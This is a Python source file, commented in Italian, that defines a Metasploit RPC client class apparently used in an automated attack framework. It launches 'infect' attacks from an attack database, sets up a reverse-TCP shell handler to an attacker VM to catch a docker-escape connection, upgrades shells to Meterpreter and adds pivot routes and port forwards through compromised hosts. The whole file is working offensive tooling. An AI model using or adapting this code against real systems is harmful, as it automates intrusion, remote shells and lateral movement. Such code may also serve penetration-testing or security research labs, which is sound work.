from pymetasploit3.msfrpc import MsfRpcClient
from util import Logger
from util import time_limit
from time import sleep as delay
from util import Constants as C
from attack import Attack_DB
import subprocess
import time
import copy

class MetaClient:

    # Delay in seconds before checking for open sessions
    GET_SESSIONS_DELAY = 1
    READ_CONSOLE_DELAY = 1
    READ_CONSOLE_BUSY_ATTEMPTS = 5

    
    #Viene creata un istanza di client Metasploit che si connette al server con password porta e ip specificati
    def __init__(self, server_password, server_port=55553, server_ip="0.0.0.0", ssl=True):

        self.output = ""

        try:
            self.client = MsfRpcClient(server_password, port=server_port, server=server_ip, ssl=ssl)
        except ConnectionError as e:
            print(f"{C.COL_RED}[-] Can't connect to msf rpc server @{server_ip}:{server_port} with password: {server_password}{C.COL_RESET}")
            Logger.log(self, f"RPC client connection error - {server_port=}, {server_ip=}, {ssl=}", level=Logger.ERROR)
            exit(1)

        Logger.log(self, f"RPC client connected - {server_port=}, {server_ip=}, {ssl=}", level=Logger.INFO)
        self.cid = self.client.consoles.console().cid
        Logger.log(self, f"Console created - {self.cid=}", level=Logger.INFO)

        # flush the banner
        self.client.consoles.console(self.cid).read()
        
    
    #Viene chiamato il metodo execute sull'attacco attack preso in input
    #se ha successo viene restituito l'ip della macchina bersaglio compromessa un dizionazio con le info sulla nuova sessione creata 
    def attempt_attack(self, attack):
        sess = attack.execute()
        if not sess:
            return None
        compromised=sess["session_host"]
        success=None
        return compromised, sess
    
    
    #Viene chiamato il metodo scan sull'attacco scan_obj preso in input
    def attempt_scan(self,scan_obj):
        scan_obj.scan()
        return
    
    
    #Vengono eseguiti massimo 5 tentativi di docker escape e se uno dei tentativi ha successo viene restituito un dizionario con la sessione creata
    def docker_escape(self, atk_sess):
        sess={}
        for i in range (0,5):
            success =self.grab_docker_escape_conn()
            if success:
                Logger.log(self, f"connection from netcat established, docker_escape successful", level=Logger.INFO)
                sess["escape_sess"]=success
                break
            else:
                Logger.log(self, f"can't establish connection from netcat attempt {i} -", level=Logger.ERROR)
        return sess
    

    #questo metodo viene solo usato per il doker escape, per catturare la connessione che arriva una volta che un admin effettua una operazione di copia 
    #sulla macchina infetta, permettendo così di farci avere una connessione sulla macchina effettuando il docker_escape
    #restituisce la nuova sessione creata se il docker-escape ha successo
    def grab_docker_escape_conn(self, payload="linux/x86/shell_reverse_tcp", sleep=True):
        """
        If a new session is created it returns the ip of the compromised machine, else it returns None.
        """

        self.old_sessions = None
        self.new_sessions = None

        self.old_sessions = self.get_active_sessions(sleep=sleep)
        
        aus_client = self.client
        
        handler_p = aus_client.modules.use('payload', payload)
        handler_p['LHOST'] = C.ATTACKER_VM   # attacker ip
        handler_p['LPORT'] = C.NETCAT_PORT   # port defined in config file to connect to the netcat port used by docker_escape

        handler = aus_client.modules.use('exploit', 'multi/handler')
        #print(self.get_active_sessions(sleep=sleep))
        handler.execute(payload=handler_p)

        delay(10)

        self.new_sessions = self.get_active_sessions(sleep=sleep)
        #print(self.get_active_sessions(sleep=sleep))

        diff = set(self.new_sessions) - set(self.old_sessions)

        if diff:
            Logger.log(self, f"Netcat session created - {diff=}", level=Logger.INFO)
            session={}
            session["id_sess"]=diff.pop()
            obtained_session = self.new_sessions[session["id_sess"]]
            session["obtained_session"]=obtained_session
            session["session_host"]=obtained_session["session_host"]
            return session
        else:
            Logger.log(self, f"unable to create netcat session", level=Logger.ERROR)
            return None
        

    #Itera sugli attacchi infect presenti nell'attack_db.json e li esegue in un sottoprocesso
    def infect(self):

        
        attack_db = Attack_DB()
        for atk in attack_db.infect_dict.keys():
            print(f"{C.COL_GREEN} Attacking with {atk}{C.COL_RESET}")
            p=subprocess.Popen(attack_db.infect_dict[atk].instruction,stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT,shell=True)
            delay(attack_db.infect_dict[atk].wait_time)
            p.wait()
            #DEBUG
            #print(stdout)
    
            
        
    

    #Gestisce il processo di aggiornamento di una shell a una shell Meterpreter 
    #restituisce l'ID della sessione Meterpreter se l'aggiornamento ha avuto successo
    def upgrade_shell(self, sess, sleep=True):
        self.old_sessions = None
        self.new_sessions = None
        output=[]
        self.old_sessions = self.get_active_sessions(sleep=sleep)
        instr_str=C.METERPRETER_UPGRADE.format(C.ATTACKER_VM,C.METERPRETER_PORT, sess)
        instr_list=instr_str.split("\n")
        #print(instr_list)
        for i in instr_list:
            self.client.consoles.console(self.cid).write(i)
            if("resource" in i or "exploit" in i or "run" in i):
                delay(50)
            else:
                delay(1)
            out=self.client.consoles.console(self.cid).read()
            #print(out)
            output.append(out["data"])
        
        with time_limit(300):
            while self.client.consoles.console(self.cid).is_busy():
                delay(1)
                
        out = self.client.consoles.console(self.cid).read()

        delay(5)

        self.new_sessions = self.get_active_sessions(sleep=sleep)

        diff = set(self.new_sessions) - set(self.old_sessions)
            
        if diff:
            Logger.log(self, f"Meterpreter shell session created - {diff=}", level=Logger.INFO)
            print(f"{C.COL_YELLOW}[*] Meterpreter shell created with success{C.COL_RESET}")
            session={}
            session["id_sess"]=diff.pop()
            obtained_session = self.new_sessions[session["id_sess"]]
            session["obtained_session"]=obtained_session
            session["session_host"]=obtained_session["session_host"]
            return session
        else:
            Logger.log(self, f"unable to create meterpreter shell session", level=Logger.ERROR)
            print(f"{C.COL_RED}[-] Meterpreter shell was not created with success, can't add the routes required...{C.COL_RESET}")
            return None   
        

    #Prepara il comando e richiama il metodo add_portfwd della classe client 
    def prepare(self, router, atk_port, exposed_port, atk_ip):
        cmd=C.ADD_PORTFWD.format(atk_ip,atk_port,exposed_port)
        self.add_portfwd(router,cmd)
        return


    #Recupera un elenco di tutte le sessioni attive associate al client
    #Se sleep = True aspetta prima di effettuare l'operazione
    def get_active_sessions(self, sleep=True):
        """
        Returns a list of open sessions associated with the client
        """ 
        if sleep:
            time.sleep(MetaClient.GET_SESSIONS_DELAY)
        if self.client:
            return copy.deepcopy(self.client.sessions.list)
        

    #print route for debugging 
    def route_print(self):
        self.client.consoles.console(self.cid).write(C.ROUTE_PRINT)
        routes=self.client.consoles.console(self.cid).read()
        print(routes['data'])
       

    
    #aggiunge una nuova route al target
    def route_add(self,sess,target_ip):
        #print(C.ROUTE_ADD.format(target_ip,sess))
        self.client.consoles.console(self.cid).write(C.ROUTE_ADD.format(target_ip,sess))
        routes=self.client.consoles.console(self.cid).read()
        #print(routes)


    #elimina tutte le route attualmente configurate
    def route_flush(self):
        self.client.consoles.console(self.cid).write("route flush")
        routes=self.client.consoles.console(self.cid).read()
        #print(routes)


    #crea un port forwarding sulla shell della sessione passata come parametro
    def add_portfwd(self, sess, cmd):
        self.route_flush()
        self.client.sessions.session(sess).write(cmd)
        portfwd=self.client.sessions.session(sess).read()















